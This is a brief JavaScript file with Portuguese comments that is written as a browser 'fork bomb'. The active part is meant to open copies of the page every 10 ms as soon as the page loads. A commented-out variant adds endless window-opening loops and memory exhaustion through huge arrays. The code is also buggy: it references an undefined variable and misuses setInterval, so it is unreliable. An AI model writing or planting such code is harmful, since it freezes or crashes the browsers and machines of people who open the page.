//ESSE CODIGO FUNCIONA SÓ DE ABRIR A PÁGINA, ABRINDO VÁRIAS PAGINAS A CADA 10MS

const botao = document.querySelector('.bomba');
let w;
link.addEventListener('click', setInterval(function(){
        w = window.open(location.href)}), 
10);

//ESSE CODIGO RODA APENAS APÓS O PRIMEIO CLIQUE
// const botao = document.querySelector('.bomba');

// const forkBomb = botao.addEventListener('click', function() {
//     let w = window.open(); 
//     w.document.writeln(`
//         <script>
//             setInterval(function() {
//                 window.open('${location.href}');
//             }, 0.0000001);
//         </script>
//     `);

//     while(1) {
//         botao.addEventListener('click', setInterval((w2)=>{
//            w2 = window.open(location.href);
//         }), 0.000000001);
//     }
    
    

//     (function bomba() {
//         return bomba();
//     });

//     let inf = [];
//     while (1) {
//     inf.push(new Array(10000000).fill('X'));
//     }

    
// });


